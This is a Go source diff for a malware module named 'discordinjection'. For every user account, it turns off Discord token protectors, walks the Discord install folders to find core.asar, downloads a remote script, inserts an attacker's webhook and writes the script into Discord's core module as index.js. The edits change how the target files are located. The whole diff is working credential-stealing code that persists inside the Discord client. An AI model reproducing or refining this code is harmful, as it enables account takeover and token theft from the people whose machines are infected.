@@ -1,21 +1,16 @@
 package discordinjection
 
 import (
-	"bufio"
 	"bytes"
 	"errors"
 	"io"
+	"io/ioutil"
 	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
 
-	"golang.org/x/text/encoding/charmap"
-
-	"encoding/json"
-
 	"github.com/0xFl4q/1237FHJQSDF1234/utils/hardware"
-	"github.com/shirou/gopsutil/v3/process"
 )
 
 // Définir le lien d'injection
@@ -25,48 +20,60 @@ func Run(webhook string) {
 	for _, user := range hardware.GetUsers() {
 		BypassBetterDiscord(user)
 		BypassTokenProtector(user)
-		for _, dir := range []string{
-			filepath.Join(user, "AppData", "Local", "discord"),
-			filepath.Join(user, "AppData", "Local", "discordcanary"),
-			filepath.Join(user, "AppData", "Local", "discordptb"),
-			filepath.Join(user, "AppData", "Local", "discorddevelopment"),
-		} {
-			InjectDiscord(dir, InjectionURL, webhook)
-		}
+		InjectDiscord(user, InjectionURL, webhook)
 	}
 }
 
-func InjectDiscord(dir string, injectionURL string, webhook string) error {
-	files, err := filepath.Glob(filepath.Join(dir, "app-*", "modules", "discord_desktop_core-*", "discord_desktop_core"))
-	if err != nil {
-		return err
+func InjectDiscord(user string, injectionURL string, webhook string) error {
+	// Recherche du fichier core.asar dans tous les répertoires spécifiés
+	discordDirs := []string{
+		filepath.Join(user, "AppData", "Local", "discord"),
+		filepath.Join(user, "AppData", "Local", "discordcanary"),
+		filepath.Join(user, "AppData", "Local", "discordptb"),
+		filepath.Join(user, "AppData", "Local", "discorddevelopment"),
 	}
-	if len(files) == 0 {
-		return errors.New("no discord_desktop_core found")
+
+	for _, dir := range discordDirs {
+		err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
+			if err != nil {
+				return err
+			}
+			if info.Name() == "core.asar" {
+				// Lorsque core.asar est trouvé, injecter le fichier index.js dans le même répertoire
+				coreDir := filepath.Dir(path)
+				err := injectFile(coreDir, injectionURL, webhook)
+				if err != nil {
+					return err
+				}
+			}
+			return nil
+		})
+		if err != nil {
+			return err
+		}
 	}
 
-	core := files[0]
+	return nil
+}
 
-	os.MkdirAll(filepath.Join(core, "initiation"), os.ModePerm)
-
+func injectFile(directory string, injectionURL string, webhook string) error {
+	// Télécharger le contenu de l'injectionURL
 	resp, err := http.Get(injectionURL)
 	if err != nil {
 		return err
 	}
 	defer resp.Body.Close()
 
-	body, err := io.ReadAll(resp.Body)
+	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
 		return err
 	}
 
-	if !bytes.Contains(body, []byte("core.asar")) {
-		return errors.New("core.asar not in body")
-	}
-
+	// Remplacer la variable webhook dans le corps du fichier
 	body = bytes.Replace(body, []byte("%WEBHOOK%"), []byte(webhook), 1)
 
-	err = os.WriteFile(filepath.Join(core, "index.js"), body, 0644)
+	// Écrire le fichier index.js dans le répertoire spécifié
+	err = ioutil.WriteFile(filepath.Join(directory, "index.js"), body, 0644)
 	if err != nil {
 		return err
 	}
